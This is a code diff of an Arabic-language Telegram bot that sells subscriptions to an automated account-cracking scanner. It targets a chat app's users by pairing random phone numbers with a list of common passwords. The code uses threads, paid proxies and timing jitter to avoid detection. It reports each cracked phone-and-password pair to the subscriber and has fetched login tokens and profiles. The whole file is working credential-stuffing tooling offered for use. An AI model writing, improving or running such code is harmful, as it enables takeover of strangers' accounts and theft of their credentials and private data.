-                for sub_id, expiry in list(subscribers.items()):
-                    status = "منتهي ❌" if now > expiry else f"نشط ✅ (باقي {int((expiry - now)/86400)} يوم)"
-                    subs_text += f"• <code>{sub_id}</code> — {status}\n"
-                bot.send_message(call.message.chat.id, subs_text, parse_mode="HTML")
-        elif call.data == "broadcast_msg":
-            user_states[user_id] = "broadcast"
-            bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "📢 أرسل رسالة الإذاعة لكل المشتركين:")
-        elif call.data == "set_threads":
-            user_states[user_id] = "set_threads"
-            bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code>\nأرسل عدد الثريدز الجديد (1 إلى 100):", parse_mode="HTML")
-
-@bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
-def handle_admin_input(message):
-    global scan_threads
-    action = user_states.pop(message.from_user.id, None)
-    if action == "add_subscriber":
-        parts = message.text.strip().split()
-        if parts and parts[0].isdigit():
-            sub_id = int(parts[0])
-            days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
-            subscribers[sub_id] = time.time() + (days * 86400)
-            bot.reply_to(message, f"✅ تم تفعيل المشترك <code>{sub_id}</code> لمدة {days} يوم.", parse_mode="HTML")
+    elif call.data == "start_scan":
+        if user_id in user_active_scans and user_active_scans[user_id].get("running"):
             try:
-                bot.send_message(sub_id, f"🎉 <b>مبروك! تم تفعيل اشتراكك لمدة {days} يوم.</b>\nأرسل /start للبدء.", parse_mode="HTML")
+                bot.answer_callback_query(call.id, "عملية الفحص تعمل لديك بالفعل!", show_alert=True)
             except Exception:
                 pass
-        else:
-            bot.reply_to(message, "❌ تنسيق خاطئ. مثال: <code>123456789 30</code>", parse_mode="HTML")
-    elif action == "del_subscriber":
-        text = message.text.strip()
-        if text.isdigit() and int(text) in subscribers:
-            del subscribers[int(text)]
-            bot.reply_to(message, f"🗑 تم حذف المشترك بنجاح.")
-        else:
-            bot.reply_to(message, "⚠️ الآيدي غير موجود.")
-    elif action == "broadcast":
-        success, failed = 0, 0
-        for sub_id in subscribers:
-            try:
-                bot.send_message(sub_id, f"📢 <b>إذاعة عامة:</b>\n\n{message.text}", parse_mode="HTML")
-                success += 1
-            except Exception:
-                failed += 1
-        bot.reply_to(message, f"📢 تم الإرسال بنجاح إلى: {success} | فشل: {failed}")
-    elif action == "set_threads":
-        if message.text.strip().isdigit() and 1 <= int(message.text.strip()) <= 100:
-            scan_threads = int(message.text.strip())
-            bot.reply_to(message, f"⚙️ تم تحديث الثريدز إلى: <code>{scan_threads}</code>", parse_mode="HTML")
-        else:
-            bot.reply_to(message, "⚠️ أرسل رقماً صحيحاً بين 1 و 100.")
+            return
 
-def run_checker_loop(chat_id, user_id, msg_id):
-    session = get_user_session(user_id)
-    passwords = [
-        'Aa123123123', 'Aa12312300', 'Aa10002000', 'Aa100200300',
-        'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
-        'Aa11223344', 'Aa123456', 'Aa12345678', 'Ali112233',
-        'Aa123456789', 'Ali100200', 'Ali20002000', 'Ahmed100200',
-        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r'
-    ]
+        try:
+            bot.delete_message(chat_id, message_id)
+        except Exception:
+            pass
+
+        scan_msg = bot.send_message(
+            chat_id,
+            "<b>جاري فحص الحسابات</b>\n\n"
+            "تم صيد : 0\n"
+            "غير مسجل : 0\n"
+            "الاخطاء : 0",
+            reply_markup=get_scanning_keyboard()
+        )
+
+        # تهيئة عزل الحالة الخاصة بهذا المستخدم حصرياً
+        user_active_scans[user_id] = {
+            "running": True,
+            "valid": 0,
+            "not_registered": 0,
+            "error": 0,
+            "message_id": scan_msg.message_id
+        }
+
+        # تشغيل خيوط الفحص المستقلة للمستخدم
+        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id), daemon=True).start()
+
+    elif call.data == "stop_scan":
+        if user_id in user_active_scans:
+            user_active_scans[user_id]["running"] = False
+        try:
+            bot.answer_callback_query(call.id, "تم إيقاف الفحص")
+            bot.edit_message_text(
+                "<b>تم إيقاف عملية الفحص الخاصة بك بنجاح</b>",
+                chat_id, message_id,
+                reply_markup=get_main_keyboard(user_id)
+            )
+        except Exception:
+            pass
+
+    # لوحة تحكم المطور
+    elif call.data == "admin_panel" and user_id == ADMIN_ID:
+        text = "⚙️ <b>لوحة تحكم المطور:</b>\nاختر العملية المطلوبة:"
+        try:
+            bot.edit_message_text(text, chat_id, message_id, reply_markup=get_admin_keyboard())
+        except Exception:
+            pass
+
+    elif call.data == "admin_add" and user_id == ADMIN_ID:
+        try:
+            msg = bot.send_message(chat_id, "✍️ أرسل الآيدي وعدد أيام الاشتراك بالصيغة التالية:\n<code>ID DAYS</code>\nمثال:\n<code>123456789 7</code>")
+            bot.register_next_step_handler(msg, process_add_sub)
+        except Exception:
+            pass
+
+    elif call.data == "admin_del" and user_id == ADMIN_ID:
+        try:
+            msg = bot.send_message(chat_id, "✍️ أرسل آيدي المستخدم المراد حذفه:\nمثال:\n<code>123456789</code>")
+            bot.register_next_step_handler(msg, process_del_sub)
+        except Exception:
+            pass
+
+    elif call.data == "admin_list" and user_id == ADMIN_ID:
+        subs = load_subscriptions()
+        if not subs:
+            text = "📋 لا توجد اشتراكات مسجلة حالياً."
+        else:
+            text = "📋 <b>قائمة المشتركين النشطين:</b>\n\n"
+            for uid, exp in subs.items():
+                if time.time() < exp:
+                    days_left = int((exp - time.time()) / 86400)
+                    text += f"• <code>{uid}</code> (متبقي {days_left} يوم)\n"
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
+        try:
+            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
+        except Exception:
+            pass
+
+# ==================== خيوط الفحص المعزولة للمستخدم ====================
+def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
+    region = 964
+    max_threads = 8  # عدد الخيوط لكل مستخدم لضمان السرعة
 
     def worker():
-        session_req = requests.Session()
-        while session["is_running"] and not session["stop_event"].is_set():
-            country = "SA"
-            mobile = generate_saudi_number()
+        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
+            phone = generate_random_phone()
+            first_pw = DEFAULT_PASSWORDS[0]
             
-            with session["stats_lock"]:
-                if mobile in session["tried"]:
-                    continue
-                session["tried"].add(mobile)
-
-            # إضافة تأخير عشوائي دقيق (Jitter) لتفادي الكشف الآلي
-            time.sleep(random.uniform(0.1, 0.35))
-
-            password = random.choice(passwords)
-            password_hashed = md5upper(password)
-            body = build_payload(mobile, password_hashed, country=country)
-            headers, wire, hera = body
-
             try:
-                response = session_req.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=8)
-                result = decode_resp(response.json(), hera)
+                res = _do_login(phone, first_pw, region)
+                st = res.get("status", "ERROR")
             except Exception:
-                with session["stats_lock"]:
-                    session["error_count"] += 1
-                # فترة انتظار قصيرة في حال حدوث خطأ شبكي لمنع تكرار الضغط السريع
-                time.sleep(1)
+                if user_id in user_active_scans:
+                    user_active_scans[user_id]["error"] += 1
                 continue
 
-            with session["stats_lock"]:
-                if not session["is_running"] or session["stop_event"].is_set():
-                    break
-                if result.get('status') == 0:
-                    session["valid_count"] += 1
-                    data = result.get('data') or {}
-                    token = data.get('token', '')
-                    uid = str(data.get('id') or data.get('showNumId') or '')
-                    
-                    prof = fetch_profile(session_req, token, uid, data, country)
-                    hit_msg = format_hit_message(data, mobile, password, country, prof)
-                    
+            if st == "NOT_REGISTERED":
+                if user_id in user_active_scans:
+                    user_active_scans[user_id]["not_registered"] += 1
+                continue
+
+            for pw in DEFAULT_PASSWORDS:
+                if pw != first_pw:
                     try:
-                        bot.send_message(chat_id, hit_msg, parse_mode="HTML")
+                        res = _do_login(phone, pw, region)
+                        st = res.get("status", "ERROR")
+                    except Exception:
+                        break
+
+                if st == "VALID":
+                    if user_id in user_active_scans:
+                        user_active_scans[user_id]["valid"] += 1
+                    
+                    # إرسال تنبيه الصيد للمستخدم مباشرة
+                    alert_text = (
+                        f"<b>تم صيد حساب يلا شات</b>\n\n"
+                        f"<b>Phone :</b> {phone}\n"
+                        f"<b>Password :</b> {pw}\n"
+                        f"By : @aboodriad"
+                    )
+                    try:
+                        bot.send_message(chat_id, alert_text)
                     except Exception:
                         pass
-                else:
-                    if result.get('status') is not None:
-                        session["wrong_count"] += 1
-                    else:
-                        session["error_count"] += 1
-
-    with ThreadPoolExecutor(max_workers=scan_threads) as executor:
-        for _ in range(scan_threads):
-            executor.submit(worker)
-        
-        while session["is_running"] and not session["stop_event"].is_set():
-            for _ in range(30):
-                if not session["is_running"] or session["stop_event"].is_set():
                     break
-                time.sleep(0.1)
-            
-            if not session["is_running"] or session["stop_event"].is_set():
-                break
-                
-            with session["stats_lock"]:
-                status_text = (
-                    f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بالبروكسي المدفوع...</b>\n\n"
-                    f"✅ صيد (Valid): {session['valid_count']}\n"
-                    f"❌ خطأ (Wrong): {session['wrong_count']}\n"
-                    f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
-                )
-            
-            try:
-                markup = get_control_keyboard(user_id) if user_id == ADMIN_ID else get_user_keyboard(user_id)
-                bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=markup)
-            except Exception:
-                pass
+                elif st == "ERROR" or st == "RATE_LIMITED":
+                    if user_id in user_active_scans:
+                        user_active_scans[user_id]["error"] += 1
 
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        for _ in range(max_threads):
+            if user_id in user_active_scans and user_active_scans[user_id]["running"]:
+                executor.submit(worker)
+
+        last_text = ""
+        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
+            state = user_active_scans[user_id]
+            v = state["valid"]
+            nr = state["not_registered"]
+            e = state["error"]
+
+            status_text = (
+                f"<b>جاري فحص الحسابات</b>\n\n"
+                f"تم صيد : {v}\n"
+                f"غير مسجل : {nr}\n"
+                f"الاخطاء : {e}",
+            )
+
+            if status_text != last_text:
+                try:
+                    bot.edit_message_text(
+                        status_text,
+                        chat_id,
+                        scan_msg_id,
+                        reply_markup=get_scanning_keyboard()
+                    )
+                    last_text = status_text
+                except Exception:
+                    pass
+            time.sleep(1.5)
+
+# ==================== دوال المطور (تفعيل وحذف الاشتراكات) ====================
+def process_add_sub(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        parts = message.text.strip().split()
+        target_id = parts[0]
+        days = int(parts[1])
+        
+        subs = load_subscriptions()
+        subs[target_id] = time.time() + (days * 86400)
+        save_subscriptions(subs)
+        
+        bot.reply_to(message, f"✅ تم تفعيل المستخدم <code>{target_id}</code> لمدة {days} يوم بنجاح.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ حدث خطأ في الصيغة: {e}")
+
+def process_del_sub(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        target_id = message.text.strip()
+        subs = load_subscriptions()
+        if target_id in subs:
+            del subs[target_id]
+            save_subscriptions(subs)
+            bot.reply_to(message, f"✅ تم حذف تفعيل المستخدم <code>{target_id}</code> بنجاح.")
+        else:
+            bot.reply_to(message, "❌ المستخدم غير موجود في القائمة.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ حدث خطأ: {e}")
+
+# ==================== تشغيل البوت مع نظام منع التوقف (Auto-Reconnect) ====================
 if __name__ == "__main__":
-    print("🤖 Bot is running with the custom paid proxy for Saudi Arabia (SA) successfully...")
-    bot.infinity_polling()
+    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Isolated UIs...")
+    while True:
+        try:
+            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print(f"⚠️ حدث انقطاع في الاتصال أو خطأ بالشبكة: {e}")
+            print("🔄 جاري إعادة الاتصال تلقائياً خلال 5 ثوانٍ...")
+            time.sleep(5)
